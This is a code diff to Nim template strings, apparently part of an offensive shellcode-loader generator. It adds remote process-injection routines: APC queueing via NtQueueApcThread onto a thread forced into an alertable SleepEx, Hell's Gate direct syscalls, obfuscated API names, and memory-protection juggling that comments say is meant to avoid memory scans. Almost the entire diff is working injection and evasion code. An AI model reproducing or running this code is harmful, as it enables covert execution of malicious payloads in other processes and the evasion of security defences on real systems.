@@ -59,6 +59,8 @@ let ShellcodeRemoteInjectMapSection * = """
                 echo obf("[-] Failed to map view of file remote")
                 echo toHex(status)
             when defined(sleepinbetween):
+                when defined(verbose):
+                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                 HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
             ptrEncText = cast[ptr byte](lpMapAddress)
             ptrDecText = cast[ptr byte](lpMapAddress)
@@ -156,8 +158,15 @@ let ShellcodeRemoteInjectMapSection * = """
             if (lpMapAddressRemote == nil):
                 echo obf("[-] Failed to map view of file remote")
                 echo toHex(status)
+            
+            when defined(QueueAPC):
+                # first create the sleep Thread before sleeping in between, because that could trigger memory scans
+                var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)
+
             when defined(sleepinbetween):
-                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)    
+                when defined(verbose):
+                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
+                HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
             ptrEncText = cast[ptr byte](lpMapAddress)
             ptrDecText = cast[ptr byte](lpMapAddress)
             when defined(Hellsgate):
@@ -166,16 +175,36 @@ let ShellcodeRemoteInjectMapSection * = """
                 else:
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtCreateThreadEx")
-            decryptlate()
-            status = NtCreateThreadEx(
-                &tHandle, 
-                THREAD_ALL_ACCESS, 
-                NULL, 
-                tProcess,
-                lpMapAddressRemote, 
-                NULL, FALSE, 0, 0, 0, NULL)
-            when defined(verbose):
-                echo obf("[*] NtCreateThreadEx: "), toHex(status)
+            
+            when defined(QueueAPC):
+                when defined(Hellsgate):
+                    if getSyscall(ntQueueApcThreadTable):
+                        syscall = ntQueueApcThreadTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtQueueApcThread")
+            
+                let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](lpMapAddressRemote)
+                #var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)
+                decryptlate()
+                status = NtQueueApcThread(remoteThreadHandle, pfnAPC, lpMapAddressRemote, nil, nil)
+                when defined(verbose):
+                    echo obf("[*] NtQueueApcThread: "), toHex(status)
+                #when defined(sleepinbetween):
+                #    HowMuchTimeWouldYouLikeToSleep(5)
+                #Sleep(10)
+                #decryptlate()
+            else:
+                decryptlate()
+                status = NtCreateThreadEx(
+                    &tHandle, 
+                    THREAD_ALL_ACCESS, 
+                    NULL, 
+                    tProcess,
+                    lpMapAddressRemote, 
+                    NULL, FALSE, 0, 0, 0, NULL)
+                when defined(verbose):
+                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
 
     injectCreateRemoteThread(enctext) 
 
@@ -223,6 +252,8 @@ let ShellcoderemoteinjectStub * = """
             
             when defined(RX):
                 when defined(sleepinbetween):
+                    when defined(verbose):
+                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                     HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                 status = uashdiasdj(tProcess,&ds,&sc_size,PAGE_EXECUTE_READ,addr oldProtection)
                 when defined(verbose):
@@ -234,6 +265,8 @@ let ShellcoderemoteinjectStub * = """
 
             when not defined(RX):
                 when defined(sleepinbetween):
+                    when defined(verbose):
+                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                     HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
             
 
@@ -284,7 +317,13 @@ let ShellcoderemoteinjectStub * = """
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
             
+            when defined(QueueAPC):
+                # Do the Sleep Thread creation before decrypting, as that could lead to memory scans.
+                var remoteThreadHandle: HANDLE = remoteForceSleep(tProcess)
+
             when defined(sleepinbetween):
+                when defined(verbose):
+                    echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                 HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
 
             ptrEncText = cast[ptr byte](addr encText[0])
@@ -311,6 +350,8 @@ let ShellcoderemoteinjectStub * = """
                         when defined(verbose):
                             echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                 when defined(sleepinbetween):
+                    when defined(verbose):
+                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                     HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
                 
                 status = NtProtectVirtualMemory(tProcess, &ds, &sc_size, PAGE_EXECUTE_READ, addr oldProtection)
@@ -323,35 +364,50 @@ let ShellcoderemoteinjectStub * = """
             
             when not defined(RX):
                 when defined(sleepinbetween):
+                    when defined(verbose):
+                        echo obf("[*] Sleeping for "), sleepbetweentime, obf(" seconds")
                     HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-
-            when defined(Hellsgate):
-                if getSyscall(ntCreateTable):
-                    syscall = ntCreateTable.wSysCall
-                else:
-                    when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
             
-            status = NtCreateThreadEx(
-                &tHandle, 
-                THREAD_ALL_ACCESS, 
-                NULL, 
-                tProcess,
-                ds, 
-                NULL, FALSE, 0, 0, 0, NULL)
+            when defined(QueueAPC):
+                when defined(Hellsgate):
+                    if getSyscall(ntQueueApcThreadTable):
+                        syscall = ntQueueApcThreadTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtQueueApcThread")
             
-            when defined(verbose):
-                echo obf("[*] NtCreateThreadEx: "), toHex(status)
+                let pfnAPC : PKNORMAL_ROUTINE = cast[PKNORMAL_ROUTINE](ds)
+                status = NtQueueApcThread(remoteThreadHandle, pfnAPC, ds, nil, nil)
+                when defined(verbose):
+                    echo obf("[*] NtQueueApcThread: "), toHex(status)
+            else:
+                when defined(Hellsgate):
+                    if getSyscall(ntCreateTable):
+                        syscall = ntCreateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+                
+                status = NtCreateThreadEx(
+                    &tHandle, 
+                    THREAD_ALL_ACCESS, 
+                    NULL, 
+                    tProcess,
+                    ds, 
+                    NULL, FALSE, 0, 0, 0, NULL)
+                
+                when defined(verbose):
+                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
 
-            when defined(Hellsgate):
-                if getSyscall(ntCloseTable):
-                    syscall = ntCloseTable.wSysCall
-                else:
-                    when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtClose")
+                when defined(Hellsgate):
+                    if getSyscall(ntCloseTable):
+                        syscall = ntCloseTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtClose")
 
-            status = NtClose(tHandle)
-            status = NtClose(tProcess)
+                status = NtClose(tHandle)
+                status = NtClose(tProcess)
 
     
 
@@ -645,7 +701,7 @@ let RemoteLoadAMSIStub* = """
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
 
-            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
+            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("Kernel32.dll")), obf("LoadLibraryA")));
             status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
             status = zuatzuastdiasyy(tHandle)
             if(status == 0):
@@ -676,7 +732,7 @@ let RemoteLoadAMSIStub* = """
             status = NtAllocateVirtualMemory(
                 tProcess, &ds, 0, &sc_size, 
                 MEM_COMMIT, 
-                PAGE_EXECUTE_READWRITE)
+                PAGE_READWRITE)
             when defined(verbose):
                 echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
             var bytesWritten: SIZE_T
@@ -700,10 +756,27 @@ let RemoteLoadAMSIStub* = """
             when defined(verbose):
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
+            
+            when defined(Hellsgate):
+                if getSyscall(ntProtectTable):
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            
+            var oldProtect: DWORD
+            var targetAddress: LPVOID = ds
+            status = NtProtectVirtualMemory(
+                tProcess, 
+                addr targetAddress, 
+                &sc_size, 
+                PAGE_READONLY, 
+                addr oldProtect)
+            
             when defined(DInvoke):
-                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
+                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
             else:
-                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
+                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
             
             when defined(Hellsgate):
                 if getSyscall(ntCreateTable):
@@ -945,7 +1018,7 @@ let RemoteLoadNTDLLStub* = """
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
 
-            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
+            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("Kernel32.dll")), obf("LoadLibraryA")));
             status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
             status = zuatzuastdiasyy(tHandle)
             if(status == 0):
@@ -980,7 +1053,7 @@ let RemoteLoadNTDLLStub* = """
             status = NtAllocateVirtualMemory(
                 tProcess, &ds, 0, &sc_size, 
                 MEM_COMMIT, 
-                PAGE_EXECUTE_READWRITE)
+                PAGE_READWRITE)
             when defined(verbose):
                 echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
             var bytesWritten: SIZE_T
@@ -1003,10 +1076,27 @@ let RemoteLoadNTDLLStub* = """
                 echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
+            
+            when defined(Hellsgate):
+                if getSyscall(ntProtectTable):
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+
+            var oldProtect: DWORD
+            var targetAddress: LPVOID = ds
+            status = NtProtectVirtualMemory(
+                tProcess, 
+                addr targetAddress, 
+                &sc_size, 
+                PAGE_READONLY, 
+                addr oldProtect)
+
             when defined(DInvoke):
-                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
+                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
             else:
-                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"))
+                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("Kernel32.dll")), obf("LoadLibraryA")))
             
             when defined(Hellsgate):
                 if getSyscall(ntCreateTable):
@@ -1030,6 +1120,128 @@ let RemoteLoadNTDLLStub* = """
                 return true
             else:
                 return false
+            
+
+"""
+
+
+let RemoteForceSleepStub* = """
+
+    proc remoteForceSleep(targetProcess: HANDLE): HANDLE =
+
+    
+        # A long Sleep time, so that for any sleep-in-between time, the thread will still be in an alertable state
+        var friendlycode: array[3, char]  = [char(0xFF), char(0xFF), char(0xFF)]
+        
+        when defined(verbose):
+            echo obf("[*] Forcing Sleep for alertable state thread in the remote process: "), targetProcess
+        var tHandle: HANDLE
+        var ds: LPVOID
+        var status: NTSTATUS
+        var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
+
+
+        when defined(SysWhispers):
+            status = oqiahsjynmxkla(targetProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
+            when defined(verbose):
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+            var bytesWritten: SIZE_T
+
+            status = oqiazasusjk(targetProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+
+            var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle(obf("kernel32.dll")), obf("SleepEx")));
+            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,targetProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
+            
+            if(status == 0):
+                return tHandle
+            else:
+                return 0
+        else:
+            when defined(Hellsgate):
+                if getSyscall(ntAllocTable):
+                    syscall = ntAllocTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+
+            status = NtAllocateVirtualMemory(
+                targetProcess, &ds, 0, &sc_size, 
+                MEM_COMMIT, 
+                PAGE_READWRITE)
+            when defined(verbose):
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
+            var bytesWritten: SIZE_T
+
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+            status = NtWriteVirtualMemory(
+                targetProcess, 
+                ds, 
+                unsafeAddr friendlycode, 
+                sc_size-1, 
+                addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+            
+            when defined(Hellsgate):
+                if getSyscall(ntProtectTable):
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            
+            var oldProtect: DWORD
+            var targetAddress: LPVOID = ds
+            status = NtProtectVirtualMemory(
+                targetProcess, 
+                addr targetAddress, 
+                &sc_size, 
+                PAGE_READONLY, 
+                addr oldProtect)
+            
+            when defined(verbose):
+                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
+            
+            when defined(DInvoke):
+                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](MyGetProcAddress(MyGetModuleHandleA(obf("kernel32.dll")), obf("SleepEx")))
+            else:
+                var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandleA(obf("kernel32.dll")), obf("SleepEx")))
+            
+            when defined(Hellsgate):
+                if getSyscall(ntCreateTable):
+                    syscall = ntCreateTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtCreateThreadEx")
+
+            status = NtCreateThreadEx(
+                &tHandle, 
+                THREAD_ALL_ACCESS, 
+                NULL, 
+                targetProcess,
+                pfnThreadRtn, 
+                ds, FALSE, 0, 0, 0, NULL)
+            when defined(verbose):
+                echo obf("[*] NtCreateThreadEx: "), toHex(status)
+            #status = NtClose(tHandle)
+
+            if(status == 0):
+                return tHandle
+            else:
+                return 0
             
 
 """
